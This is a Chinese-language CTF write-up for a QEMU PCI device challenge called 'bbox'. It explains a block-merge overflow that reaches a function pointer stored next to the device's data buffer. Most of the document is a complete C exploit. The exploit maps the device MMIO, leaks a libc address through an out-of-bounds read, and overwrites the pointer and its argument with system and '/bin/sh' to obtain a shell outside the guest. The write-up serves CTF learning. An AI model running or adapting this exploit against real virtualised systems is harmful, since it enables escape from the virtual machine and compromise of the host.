## bbox

核心漏洞：对象属性（Block Size）的变化没有在位置移动（Swap）时进行安全性检查

`VirtSecDevice` 维护了一个固定大小的缓冲区 `data_buffer` (256字节)，并将其划分为 16 个 16 字节的块（Block）。每个块的物理偏移量（`data_offset`）是根据其索引固定的（`index * 16`）

然而，`CMD_MERGE_BLOCKS` 命令允许合并两个相邻的块，合并后的 `block1` 大小会变为 32 字节（甚至更大，如果多次合并），但它仍然占据原来的索引位置

通过构造一个位于索引 15 的大块，并向该块的后半部分（偏移 16-31）写入数据，攻击者可以覆盖紧跟在 `data_buffer` 后面的结构体成员

```cpp
uint8_t data_buffer[VIRTSEC_MAX_BLOCKS * VIRTSEC_MAX_BLOCK_SIZE]; // 偏移 0x...
int (*gift_function)(const char *format, ...);                    // 紧邻 data_buffer
const char* gift_param1;
```

攻击者可以覆盖 `gift_function` 指针 和 参数

当大块位于末尾时，通过 MMIO 读取越界数据，获取 `printf` 地址

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdint.h>

unsigned char* mmio_mem;

#define VIRTSEC_REG_MAGIC           0x00
#define VIRTSEC_REG_VERSION         0x04
#define VIRTSEC_REG_STATUS          0x08
#define VIRTSEC_REG_COMMAND         0x0C
#define VIRTSEC_REG_SESSION_ID      0x10
#define VIRTSEC_REG_BLOCK_ID        0x14
#define VIRTSEC_REG_BLOCK_SIZE      0x18
#define VIRTSEC_REG_DATA_OFFSET     0x1C
#define VIRTSEC_REG_ERROR_CODE      0x20
#define VIRTSEC_REG_ACTIVE_BLOCKS   0x24
#define VIRTSEC_REG_MERGE_BLOCK1    0x30
#define VIRTSEC_REG_MERGE_BLOCK2    0x34
#define VIRTSEC_REG_GIFT_FUNCTION   0x38

#define VIRTSEC_DATA_BUFFER_OFFSET  0x1000

#define CMD_INIT_SESSION    0x01
#define CMD_WRITE_BLOCK     0x02
#define CMD_READ_BLOCK      0x03
#define CMD_MERGE_BLOCKS    0x04
#define CMD_GET_STATUS      0x05
#define CMD_RESET           0x06

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

void write_block_data(uint32_t block_id, const char* data, uint32_t size)
{
    mmio_write(VIRTSEC_REG_BLOCK_ID, block_id);
    
    for (uint32_t i = 0; i < size; i += 4) {
        uint32_t value = 0;
        uint32_t remaining = size - i;
        uint32_t copy_size = remaining >= 4 ? 4 : remaining;
        
        memcpy(&value, data + i, copy_size);
        mmio_write(VIRTSEC_DATA_BUFFER_OFFSET + i, value);
    }
}

void read_block_data_safe(uint32_t block_id, char* buffer, uint32_t size, uint32_t buffer_size)
{
    if (size > buffer_size) {
        printf("警告: 请求读取大小 %u 超过缓冲区大小 %u\n", size, buffer_size);
        size = buffer_size;
    }
    
    mmio_write(VIRTSEC_REG_BLOCK_ID, block_id);
    mmio_write(VIRTSEC_REG_COMMAND, CMD_READ_BLOCK);
    
    memset(buffer, 0, buffer_size);
    
    printf("开始读取 %u 字节数据...\n", size);
    
    for (uint32_t i = 0; i < size; i += 4) {
        uint32_t error_code = mmio_read(VIRTSEC_REG_ERROR_CODE);
        if (error_code != 0) {
            printf("读取偏移 %u 时设备报告错误: %u\n", i, error_code);
            break;
        }
        
        uint32_t value = mmio_read(VIRTSEC_DATA_BUFFER_OFFSET + i);
        
        uint32_t remaining = size - i;
        uint32_t copy_size = remaining >= 4 ? 4 : remaining;
        
        memcpy(buffer + i, &value, copy_size);
        
        // 只打印关键偏移的值
        if (i % 32 == 0 || i >= 240) {
            printf("偏移 0x%x: 0x%08x", i, value);
            if (i >= 256) {
                printf(" <- gift_function区域");
            }
            printf("\n");
        }
    }
}

void check_device_status()
{
    uint32_t status = mmio_read(VIRTSEC_REG_STATUS);
    uint32_t error_code = mmio_read(VIRTSEC_REG_ERROR_CODE);
    uint32_t active_blocks = mmio_read(VIRTSEC_REG_ACTIVE_BLOCKS);
    
    printf("设备状态: 0x%x, 错误代码: %u, 活跃块数: %u\n", status, error_code, active_blocks);
}

void print_data_safe(const char* prefix, const char* data, uint32_t size)
{
    printf("%s", prefix);
    for (uint32_t i = 0; i < size; i++) {
        if (i > 0 && i % 16 == 0) printf("\n  ");
        if (data[i] >= 32 && data[i] <= 126) {
            printf("%c", data[i]);
        } else {
            printf("\\x%02x", (unsigned char)data[i]);
        }
    }
    printf("\n");
}

int main(int argc, char *argv[])
{
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);

    uint32_t magic = mmio_read(VIRTSEC_REG_MAGIC);
    uint32_t version = mmio_read(VIRTSEC_REG_VERSION);
    printf("设备魔数: 0x%x, 版本: 0x%x\n", magic, version);

    // 1. 初始化会话
    printf("\n=== 初始化会话 ===\n");
    mmio_write(VIRTSEC_REG_SESSION_ID, 0x12345678);
    mmio_write(VIRTSEC_REG_COMMAND, CMD_INIT_SESSION);
    check_device_status();

    // 3. 创建16个连续的块来占满整个data_buffer
    printf("\n=== 创建16个连续的块以占满data_buffer ===\n");
    
    for (uint32_t i = 0; i < 16; i++) {
        printf("创建Block %u...\n", i);
        mmio_write(VIRTSEC_REG_BLOCK_ID, i);
        mmio_write(VIRTSEC_REG_BLOCK_SIZE, 16);
        mmio_write(VIRTSEC_REG_COMMAND, CMD_WRITE_BLOCK);
        
        // 写入标识数据
        char block_data[16];
        snprintf(block_data, sizeof(block_data), "Block%02u_Data123", i);
        write_block_data(i, block_data, 16);
        
        uint32_t error_code = mmio_read(VIRTSEC_REG_ERROR_CODE);
        if (error_code != 0) {
            printf("创建Block %u 失败，错误代码: %u\n", i, error_code);
            break;
        }
    }
    
    check_device_status();

    // 4. 合并所有16个块到block0，创建256字节的大块
    printf("\n=== 合并所有块创建256字节大块 ===\n");
    
    // 合并block0和block1
    mmio_write(VIRTSEC_REG_MERGE_BLOCK1, 0);
    mmio_write(VIRTSEC_REG_MERGE_BLOCK2, 1);
    mmio_write(VIRTSEC_REG_COMMAND, CMD_MERGE_BLOCKS);
    check_device_status();
    
    // 继续合并剩余的块到block0
    for (uint32_t i = 2; i < 16; i++) {
        printf("合并Block0和Block%u...\n", i);
        mmio_write(VIRTSEC_REG_MERGE_BLOCK1, 0);
        mmio_write(VIRTSEC_REG_MERGE_BLOCK2, i);
        mmio_write(VIRTSEC_REG_COMMAND, CMD_MERGE_BLOCKS);
        
        uint32_t error_code = mmio_read(VIRTSEC_REG_ERROR_CODE);
        if (error_code != 0) {
            printf("合并失败，错误代码: %u\n", error_code);
            break;
        }
    }
    
    printf("现在Block0应该是256字节（16个块合并）\n");
    check_device_status();

    // 5. 创建一个额外的块用于扩展
    printf("\n=== 创建额外的块用于扩展到gift_function区域 ===\n");
    mmio_write(VIRTSEC_REG_BLOCK_ID, 20);
    mmio_write(VIRTSEC_REG_BLOCK_SIZE, 16);
    mmio_write(VIRTSEC_REG_COMMAND, CMD_WRITE_BLOCK);
    
    char extra_data[16] = "EXTRA_GIFT_DATA!";
    write_block_data(20, extra_data, 16);
    check_device_status();

    // 6. 进行最后的合并，扩展到gift_function区域
    printf("\n=== 关键的额外合并，扩展到gift_function区域 ===\n");
    printf("合并Block0(256字节)和Block20(16字节)，总共272字节\n");
    
    mmio_write(VIRTSEC_REG_MERGE_BLOCK1, 0);
    mmio_write(VIRTSEC_REG_MERGE_BLOCK2, 20);
    mmio_write(VIRTSEC_REG_COMMAND, CMD_MERGE_BLOCKS);
    
    uint32_t error_code = mmio_read(VIRTSEC_REG_ERROR_CODE);
    if (error_code == 0) {
        printf("成功！Block0现在应该是272字节\n");
    } else {
        printf("额外合并失败，错误代码: %u\n", error_code);
    }
    check_device_status();

    // 7. 现在初始化gift_function（关键步骤！）
    printf("\n=== 现在初始化gift_function ===\n");
    printf("触发后门函数初始化...\n");
    printf("注意：现在会直接调用gift_function，可能会看到输出或崩溃\n");
    
    // 刷新输出缓冲区
    fflush(stdout);
    
    // 触发gift_function初始化
    mmio_write(VIRTSEC_REG_GIFT_FUNCTION, 1);
    
    printf("触发完成\n");
    fflush(stdout);

    // 9. 读取包含gift_function的完整数据进行对比
    printf("\n=== 通过越界读取验证gift_function指针 ===\n");
    char large_buffer[512];
    printf("读取280字节数据，验证越界读取结果...\n");
    
    read_block_data_safe(0, large_buffer, 280, sizeof(large_buffer));
    
    // 分析gift_function指针的值
    printf("\n=== 对比分析 ===\n");
    
    // 从越界读取中提取gift_function指针
    uint64_t gift_func_from_overflow = 0;
    memcpy(&gift_func_from_overflow, &large_buffer[256], 8);
    
    // printf("直接读取寄存器的gift_function: 0x%08x\n", gift_func_after_init);
    printf("越界读取的gift_function (64位): 0x%016lx\n", gift_func_from_overflow);
    printf("越界读取的gift_function (32位): 0x%08x\n", (uint32_t)gift_func_from_overflow);
    
    uint64_t system_addr= gift_func_from_overflow - 0x00000000000606f0 + 0x0000000000050d70;
    uint64_t binsh_addr= gift_func_from_overflow - 0x00000000000606f0 + 0x000000000001d8678;
    printf("system_addr: 0x%016lx\n", system_addr);
    
    check_device_status();

        // 创建1-15个连续的块来占满整个data_buffer
    printf("\n=== 创建15个连续的块以占满data_buffer ===\n");
    
    for (uint32_t i = 1; i < 16; i++) {
        printf("创建Block %u...\n", i);
        mmio_write(VIRTSEC_REG_BLOCK_ID, i);
        mmio_write(VIRTSEC_REG_BLOCK_SIZE, 16);
        mmio_write(VIRTSEC_REG_COMMAND, CMD_WRITE_BLOCK);
        
        // 写入标识数据
        char block_data[16];
        if(i == 15){
            memcpy(block_data, &system_addr, 8);
            memcpy(block_data + sizeof(system_addr), "/bin/sh\x00", 8);
        }
        else{
            snprintf(block_data, sizeof(block_data), "Block%02u_Data666", i);
        }
        write_block_data(i, block_data, 16);
        
        uint32_t error_code = mmio_read(VIRTSEC_REG_ERROR_CODE);
        if (error_code != 0) {
            printf("创建Block %u 失败，错误代码: %u\n", i, error_code);
            break;
        }
    }
    
    check_device_status();

    // 4. 合并所有15个块到block1，创建256字节的大块
    printf("\n=== 合并所有块创建256字节大块 ===\n");
    
    // 合并block0和block1
    mmio_write(VIRTSEC_REG_MERGE_BLOCK1, 1);
    mmio_write(VIRTSEC_REG_MERGE_BLOCK2, 2);
    mmio_write(VIRTSEC_REG_COMMAND, CMD_MERGE_BLOCKS);
    check_device_status();
    
    // 继续合并剩余的块到block0
    for (uint32_t i = 3; i < 16; i++) {
        printf("合并Block0和Block%u...\n", i);
        mmio_write(VIRTSEC_REG_MERGE_BLOCK1, 1);
        mmio_write(VIRTSEC_REG_MERGE_BLOCK2, i);
        mmio_write(VIRTSEC_REG_COMMAND, CMD_MERGE_BLOCKS);
        
        uint32_t error_code = mmio_read(VIRTSEC_REG_ERROR_CODE);
        if (error_code != 0) {
            printf("合并失败，错误代码: %u\n", error_code);
            break;
        }
    }
    mmio_write(VIRTSEC_REG_BLOCK_ID, 3);
    mmio_write(VIRTSEC_REG_BLOCK_SIZE, 16);
    mmio_write(VIRTSEC_REG_COMMAND, CMD_WRITE_BLOCK);
    
    char extra_data2[16];
    memcpy(extra_data2, &system_addr, 8);
    memcpy(extra_data2 + 8, &binsh_addr , 8);

    write_block_data(3, extra_data2, 16);

    mmio_write(VIRTSEC_REG_MERGE_BLOCK1, 1);
    mmio_write(VIRTSEC_REG_MERGE_BLOCK2, 3);
    mmio_write(VIRTSEC_REG_COMMAND, CMD_MERGE_BLOCKS);


    mmio_write(VIRTSEC_REG_GIFT_FUNCTION, 1);

    munmap(mmio_mem, 0x2000);
    close(mmio_fd);

    return 0;
}
```

> 这里给出相关结构体，但是在附件中是没有这个结构体的，本意上是防LLM，但是如果能逆出结构体再配合LLM就可以更快的做出来
>
> ```cpp
> struct VirtSecDevice {
>     PCIDevice parent_obj;
>     
>     // 内存映射区域
>     MemoryRegion mmio;
>     
>     // 设备状态
>     VirtSecState current_state;
>     uint32_t session_id;
>     uint32_t error_code;
>     
>     // 协议处理
>     VirtSecHeader current_header;
>     uint32_t header_received;
>     bool header_complete;
>     
>     // 数据处理
>     uint32_t expected_data_size;
>     uint32_t current_data_len;
>     uint32_t data_offset;
>     
>     // 数据块管理
>     VirtSecBlock blocks[VIRTSEC_MAX_BLOCKS];
>     uint32_t active_blocks;
>     uint32_t current_block_id;
>     
>     // 合并指定块
>     uint32_t merge_block1_id;
>     uint32_t merge_block2_id;
>     
>     // 固定数据缓冲区 (16个块 x 16字节 = 256字节)
>     uint8_t data_buffer[VIRTSEC_MAX_BLOCKS * VIRTSEC_MAX_BLOCK_SIZE];
>     int (*gift_function)(const char *format, ...);
>     const char* gift_param1;
>     uint8_t encrypted_buffer[VIRTSEC_MAX_BLOCKS * VIRTSEC_MAX_BLOCK_SIZE];
>     
>     // 合并缓冲区
>     uint8_t merge_buffer[VIRTSEC_MAX_MERGE_SIZE];
>     uint32_t merge_data_size;
>     
>     // 加密密钥
>     uint8_t encryption_key[32];
>     
>     // 统计信息
>     uint64_t blocks_processed;
>     uint64_t bytes_transferred;
>     uint64_t errors_encountered;
> };
> 
> ```